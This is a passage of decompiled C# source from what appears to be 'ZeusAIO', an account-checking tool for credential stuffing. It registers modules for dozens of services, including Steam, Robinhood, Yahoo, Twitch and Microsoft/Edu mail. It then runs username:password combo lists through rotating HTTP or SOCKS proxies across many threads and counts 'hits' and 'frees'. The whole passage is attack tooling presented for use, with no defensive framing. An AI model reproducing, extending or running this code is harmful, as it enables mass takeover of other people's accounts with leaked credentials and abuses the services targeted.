        Colorful.Console.WriteLine(">> Smoothie king Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "57")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Surfshark");
        Colorful.Console.WriteLine(">> Surfshark Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "58")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Symbolab");
        Colorful.Console.WriteLine(">> Symbolab Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "59")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Twitch");
        Colorful.Console.WriteLine(">> Twitch Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "60")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Udacity");
        Colorful.Console.WriteLine(">> Udacity Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "61")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Ullu");
        Colorful.Console.WriteLine(">> Ullu Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "62")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Voot");
        Colorful.Console.WriteLine(">> Voot Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "63")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Vortex.gg");
        Colorful.Console.WriteLine(">> Vortex.gg Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "64")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Waves.com");
        Colorful.Console.WriteLine(">> Waves.com Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "65")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Yahoo");
        Colorful.Console.WriteLine(">> Yahoo Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "66")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Beeg.com");
        Colorful.Console.WriteLine(">> Beeg.com Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "67")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Bitlaunch.io");
        Colorful.Console.WriteLine(">> Bitlaunch.io Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "68")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Md5 Dehasher");
        Colorful.Console.WriteLine(">> Md5 Dehasher Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "69")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Reddit");
        Colorful.Console.WriteLine(">> Reddit Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "70")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Steam");
        Colorful.Console.WriteLine(">> Steam Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "71")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Gfuel");
        Colorful.Console.WriteLine(">> Gfuel Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "72")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Doordash");
        Colorful.Console.WriteLine(">> Doordash Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "73")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Pornhub");
        Colorful.Console.WriteLine(">> Pornhub Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "74")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Robinhood");
        Colorful.Console.WriteLine(">> Robinhood Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "75")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Patreon.com");
        Colorful.Console.WriteLine(">> Patreon.com Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "76")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Gamefly");
        Colorful.Console.WriteLine(">> Gamefly Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "77")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Gucci");
        Colorful.Console.WriteLine(">> Gucci Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "78")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Xcams");
        Colorful.Console.WriteLine(">> Xcams Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "79")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("PostmatesFleet");
        Colorful.Console.WriteLine(">> Postmates Fleet Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "80")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Adfly");
        Colorful.Console.WriteLine(">> Adfly Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "81")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Ufc");
        Colorful.Console.WriteLine(">> Ufc Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "82")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Nba");
        Colorful.Console.WriteLine(">> Nba Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "83")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Godaddy");
        Colorful.Console.WriteLine(">> Godaddy Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "84")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Scribd");
        Colorful.Console.WriteLine(">> Scribd Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "85")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Forever21");
        Colorful.Console.WriteLine(">> Forever21 Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "86")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Apowersoft");
        Colorful.Console.WriteLine(">> Apowersoft Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "87")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Avira");
        Colorful.Console.WriteLine(">> Avira Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "88")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Wwe");
        Colorful.Console.WriteLine(">> Wwe Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "89")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Sling TV");
        Colorful.Console.WriteLine(">> Sling TV Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "90")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Fox");
        Colorful.Console.WriteLine(">> Fox Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "91")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Tubi Tv");
        Colorful.Console.WriteLine(">> Tubi Tv Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "92")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Bitesquad");
        Colorful.Console.WriteLine(">> Bitesquad Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "93")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("PizzaHut UK Valid Mail");
        Colorful.Console.WriteLine(">> PizzaHut UK Valid Mail Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "94")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Twitch Legacy");
        Colorful.Console.WriteLine(">> Twitch Legacy Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "95")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Upcloud");
        Colorful.Console.WriteLine(">> Upcloud Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "96")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Microsft/Edu MA");
        Colorful.Console.WriteLine(">> Microsft/Edu Mail Access Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "97")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Fwrd");
        Colorful.Console.WriteLine(">> Fwrd Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "98")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Bagel Boy");
        Colorful.Console.WriteLine(">> Bagel Boy Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "99")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Wordpress");
        Colorful.Console.WriteLine(">> Wordpress Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "100")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Viaplay");
        Colorful.Console.WriteLine(">> Viaplay Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "b")
        mainmenu.menu();
      else if (str == "s" && mainmenu.pickedModules.Count > 0)
      {
        Colorful.Console.Clear();
        Write.ascii();
        Colorful.Console.WriteLine(">> Instalizing...", Color.LawnGreen);
        Thread.Sleep(1000);
        mainmenu.startChecking();
      }
      else
        mainmenu.Checkingoptions();
    }

    private static void startChecking()
    {
      mainmenu.pickedModulesNames.Remove("Idle");
      Colorful.Console.Clear();
      Write.ascii();
      Colorful.Console.Title = "ZeusAIO [v0.02] - YoBoi#9999  | Modules picked - " + string.Join(", ", (IEnumerable<string>) mainmenu.pickedModulesNames);
label_1:
      Colorful.Console.WriteLine(">> Threads: ");
      while (mainmenu.globalThreads <= 0)
      {
        try
        {
          mainmenu.globalThreads = int.Parse(Colorful.Console.ReadLine());
        }
        catch
        {
          Colorful.Console.WriteLine(">> Error parsing integer!\n", Color.Red);
          goto label_1;
        }
      }
      while (true)
      {
        Colorful.Console.WriteLine();
        Colorful.Console.WriteLine(">> Please Pick Proxy Type: ", Color.WhiteSmoke);
        Colorful.Console.WriteLine();
        Colorful.Console.Write("[", Color.Lavender);
        Colorful.Console.Write("1", Color.LawnGreen);
        Colorful.Console.Write("]", Color.Lavender);
        Colorful.Console.Write(" Http\n", Color.White);
        Colorful.Console.Write("[", Color.Lavender);
        Colorful.Console.Write("2", Color.LawnGreen);
        Colorful.Console.Write("]", Color.Lavender);
        Colorful.Console.Write(" Socks4\n", Color.White);
        Colorful.Console.Write("[", Color.Lavender);
        Colorful.Console.Write("3", Color.LawnGreen);
        Colorful.Console.Write("]", Color.Lavender);
        Colorful.Console.Write(" Socks5\n", Color.White);
        switch (Colorful.Console.ReadKey(true).KeyChar)
        {
          case '1':
            goto label_6;
          case '2':
            goto label_7;
          case '3':
            goto label_8;
          default:
            Colorful.Console.WriteLine("\n>> Invalid option!\n", Color.Red);
            continue;
        }
      }
label_6:
      mainmenu.proxyProtocol = "HTTP";
      Colorful.Console.WriteLine("\n>> Using HTTP/s...\n", Color.Magenta);
      goto label_10;
label_7:
      mainmenu.proxyProtocol = "SOCKS4";
      Colorful.Console.WriteLine("\n>> Using Socks-4...\n", Color.Magenta);
      goto label_10;
label_8:
      mainmenu.proxyProtocol = "SOCKS5";
      Colorful.Console.WriteLine("\n>> Using Socks-5...\n", Color.Magenta);
label_10:
      Import.LoadCombos();
      Import.LoadProxies();
      for (int index = 1; index <= mainmenu.globalThreads; ++index)
        new Thread((ThreadStart) (() =>
        {
          Random random = new Random();
          while (true)
          {
            if (mainmenu.comboIndex < mainmenu.combos.Count<string>())
            {
              int comboIndex = mainmenu.comboIndex;
              Interlocked.Increment(ref mainmenu.comboIndex);
              string[] strArray = mainmenu.combos.ElementAt<string>(comboIndex).Split(':');
              string str = mainmenu.proxies.ElementAt<string>(random.Next(mainmenu.proxiesCount));
              using (IEnumerator<Func<string[], string, bool>> enumerator = ((IEnumerable<Func<string[], string, bool>>) mainmenu.pickedModules).Distinct<Func<string[], string, bool>>().GetEnumerator())
              {
                while (((IEnumerator) enumerator).MoveNext())
                  enumerator.Current.Invoke(strArray, str);
              }
              ++mainmenu.checks;
            }
            else
              break;
          }
        })).Start();
      if (mainmenu.p1 == "1")
      {
        mainmenu.updateTitle();
      }
      else
      {
        if (!(mainmenu.p1 == "2"))
          return;
        mainmenu.updateTitle1();
      }
    }

    private static void updateTitle()
    {
      int checks = mainmenu.checks;
      while (true)
      {
        mainmenu.cpm = mainmenu.checks - checks;
        checks = mainmenu.checks;
        Colorful.Console.Clear();
        Write.ascii();
        Colorful.Console.Title = "ZeusAIO [v0.02] - YoBoi#9999  | Modules: " + string.Join(", ", (IEnumerable<string>) mainmenu.pickedModulesNames) + " | Hits - " + mainmenu.hits.ToString() + " | Frees - " + mainmenu.frees.ToString() + " | Bads - " + (mainmenu.checks - mainmenu.hits - mainmenu.frees).ToString() + " | Checked - " + mainmenu.checks.ToString() + "/" + mainmenu.comboTotal.ToString() + " | Errors - " + mainmenu.errors.ToString() + " | Cpm - " + (mainmenu.cpm * 60).ToString();
        Colorful.Console.WriteLine();
        Colorful.Console.WriteLine("[>>] Modules: " + string.Join(", ", (IEnumerable<string>) mainmenu.pickedModulesNames), Color.White);
        Colorful.Console.WriteLine();
        Colorful.Console.Write("[>>] Hits", Color.White);
        Colorful.Console.Write(" : ", Color.NavajoWhite);
        Colorful.Console.Write(mainmenu.hits, Color.Green);
        Colorful.Console.WriteLine();
        Colorful.Console.Write("[>>] Frees", Color.White);
        Colorful.Console.Write(" : ", Color.NavajoWhite);
        Colorful.Console.Write(mainmenu.frees, Color.OrangeRed);
        Colorful.Console.WriteLine();
        Colorful.Console.Write("[>>] Bads", Color.White);
        Colorful.Console.Write(" : ", Color.NavajoWhite);
        Colorful.Console.Write(mainmenu.checks - mainmenu.hits - mainmenu.frees, Color.Red);
        Colorful.Console.WriteLine();
        Colorful.Console.Write("[>>] Checked", Color.White);
        Colorful.Console.Write(" : ", Color.NavajoWhite);
        Colorful.Console.Write(mainmenu.checks, Color.Orange);
        Colorful.Console.Write("/", Color.NavajoWhite);
        Colorful.Console.Write(mainmenu.comboTotal, Color.DarkOrange);
        Colorful.Console.WriteLine();
        Colorful.Console.Write("[>>] Threads", Color.White);
        Colorful.Console.Write(" : ", Color.NavajoWhite);
        Colorful.Console.Write(mainmenu.globalThreads, Color.Chocolate);
        Colorful.Console.Write("/", Color.NavajoWhite);
        Colorful.Console.Write(mainmenu.globalThreads, Color.Chocolate);
        Colorful.Console.WriteLine();
        Colorful.Console.Write("[>>] Errors", Color.White);
        Colorful.Console.Write(" : ", Color.NavajoWhite);
        Colorful.Console.Write(mainmenu.errors, Color.DimGray);
        Colorful.Console.WriteLine();
        Colorful.Console.Write("[>>] Cpm", Color.White);
        Colorful.Console.Write(" : ", Color.NavajoWhite);
        Colorful.Console.Write(mainmenu.cpm * 60, Color.DeepSkyBlue);
        Colorful.Console.WriteLine();
        Thread.Sleep(Config.config.RefreshRate);
        if (mainmenu.checks >= mainmenu.comboTotal)
        {
          Colorful.Console.Title = "ZeusAIO [v0.02] - YoBoi#9999  | Modules: " + string.Join(", ", (IEnumerable<string>) mainmenu.pickedModulesNames) + " | Hits: " + mainmenu.hits.ToString() + " -- Finished Checking...";
          Colorful.Console.WriteLine("Finished Checking...", Color.LawnGreen);
          Thread.Sleep(-1);
        }
      }
    }

    private static void updateTitle1()
    {
      int checks = mainmenu.checks;
      while (true)
      {
        mainmenu.cpm = mainmenu.checks - checks;
        checks = mainmenu.checks;
        Colorful.Console.Title = "ZeusAIO [v0.02] - YoBoi#9999  | Modules: " + string.Join(", ", (IEnumerable<string>) mainmenu.pickedModulesNames) + " | Hits - " + mainmenu.hits.ToString() + " | Frees - " + mainmenu.frees.ToString() + " | Bads - " + (mainmenu.checks - mainmenu.hits - mainmenu.frees).ToString() + " | Checked - " + mainmenu.checks.ToString() + "/" + mainmenu.comboTotal.ToString() + " | Errors - " + mainmenu.errors.ToString() + " | Cpm - " + (mainmenu.cpm * 60).ToString();
        Thread.Sleep(1000);
        if (mainmenu.checks >= mainmenu.comboTotal)
        {
          Colorful.Console.Title = "ZeusAIO [v0.02] - YoBoi#9999  | Modules: " + string.Join(", ", (IEnumerable<string>) mainmenu.pickedModulesNames) + " | Hits: " + mainmenu.hits.ToString() + " -- Finished Checking...";
          Colorful.Console.WriteLine("Finished Checking...", Color.LawnGreen);
          Thread.Sleep(-1);
        }
      }
    }
  }
}
